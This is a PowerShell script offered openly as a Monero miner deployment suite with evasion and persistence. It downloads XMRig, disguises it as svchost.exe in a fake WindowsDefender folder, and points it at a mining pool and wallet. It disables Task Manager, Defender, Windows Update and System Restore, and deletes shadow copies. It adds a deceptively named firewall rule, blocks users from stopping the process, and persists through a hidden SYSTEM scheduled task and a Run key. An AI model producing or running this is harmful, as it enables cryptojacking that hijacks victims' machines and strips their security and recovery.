# Monero miner deployment - full evasion and persistence suite
# Run as Administrator

$minerUrl = "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip"
$poolAddress = "pool.supportxmr.com:5555"
$walletAddress = "46YWB9PxCUH2qsGSroNEFW1unaQKGHd7rU88y1ZFv4qS3XyF4vXo5XpWmtYS1d22AH82GFqu13N4TQPyNRs5wWxv3AjyXMK"
$workerName = $env:COMPUTERNAME
$installPath = "$env:APPDATA\WindowsDefender"
$zipPath = "$env:TEMP\xmrig.zip"
$extractPath = "$installPath\xmrig"
$obfuscatedExe = "$extractPath\svchost.exe"

# 1. Disable Task Manager
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System"
if (-not (Test-Path $regPath)) { New-Item -Path $regPath -Force }
Set-ItemProperty -Path $regPath -Name "DisableTaskMgr" -Value 1 -Type DWord -Force

# 2. Disable Windows Defender real-time and add exclusions
Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableBehaviorMonitoring $true -DisableScriptScanning $true -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionPath $installPath -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionProcess "svchost.exe" -ErrorAction SilentlyContinue
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -Type DWord -Force

# 3. Disable Windows Update and System Restore
Stop-Service wuauserv -Force -ErrorAction SilentlyContinue
Set-Service wuauserv -StartupType Disabled -ErrorAction SilentlyContinue
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" -Name "DisableSR" -Value 1 -Type DWord -Force
vssadmin delete shadows /all /quiet 2>$null

# 4. Create hidden directory
if (-not (Test-Path $installPath)) { New-Item -ItemType Directory -Path $installPath -Force -Hidden }

# 5. Download miner
Invoke-WebRequest -Uri $minerUrl -OutFile $zipPath

# 6. Extract archive
Add-Type -AssemblyName System.IO.Compression.FileSystem
[System.IO.Compression.ZipFile]::ExtractToDirectory($zipPath, $extractPath)

# 7. Obfuscate executable name (rename to svchost.exe)
Move-Item "$extractPath\xmrig.exe" $obfuscatedExe -Force

# 8. Create config.json with CPU limiting (30% hint, yield, low priority)
$config = @"
{
    "autosave": true,
    "cpu": { "enabled": true, "max-threads-hint": 30, "yield": true, "priority": 1 },
    "pools": [{ "url": "$poolAddress", "user": "$walletAddress", "pass": "$workerName", "tls": false }]
}
"@
$config | Out-File -FilePath "$extractPath\config.json" -Encoding utf8

# 9. Create launcher script (hidden)
$launcher = @"
Start-Process -WindowStyle Hidden -FilePath "$obfuscatedExe" -ArgumentList "--config=$extractPath\config.json"
"@
$launcherPath = "$installPath\launcher.ps1"
$launcher | Out-File -FilePath $launcherPath -Encoding ascii

# 10. Alternate data stream for launcher (fallback)
$adsPath = "$installPath\visible.txt"
"powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$launcherPath`"" | Out-File -FilePath $adsPath -Encoding ascii
Start-Process -FilePath "powershell.exe" -ArgumentList "-Command `"Get-Content '$adsPath' | Out-File '$installPath\visible.txt:run'`"" -WindowStyle Hidden

# 11. Add firewall rule for miner
New-NetFirewallRule -DisplayName "Windows Update Service" -Direction Outbound -Program $obfuscatedExe -Action Allow -Protocol TCP -LocalPort 5555 -ErrorAction SilentlyContinue
Set-NetFirewallProfile -Profile Domain,Public,Private -NotifyOnListen False -ErrorAction SilentlyContinue

# 12. Protect process with icacls (deny terminate to Users)
icacls $obfuscatedExe /deny "Users:(WD,DE,DC)" 2>$null

# 13. Scheduled task as SYSTEM (AtLogOn and AtStartup)
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$launcherPath`""
$trigger1 = New-ScheduledTaskTrigger -AtStartup
$trigger2 = New-ScheduledTaskTrigger -AtLogOn -User "SYSTEM"
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden
Register-ScheduledTask -TaskName "WindowsUpdateService" -Action $action -Trigger $trigger1,$trigger2 -Settings $settings -User "SYSTEM" -RunLevel Highest -Force

# 14. Registry run key (fallback persistence)
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsDefenderUpdate" -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$launcherPath`"" -Force

# 15. Hide directory + alternate data stream folder attribute
attrib +s +h $installPath

# 16. Start miner immediately
Start-Process -WindowStyle Hidden -FilePath $obfuscatedExe -ArgumentList "--config=$extractPath\config.json"

# 17. Cleanup
Remove-Item $zipPath -Force
Remove-Item $adsPath -Force

# 18. Print success message
Write-Output "Ran successfully"
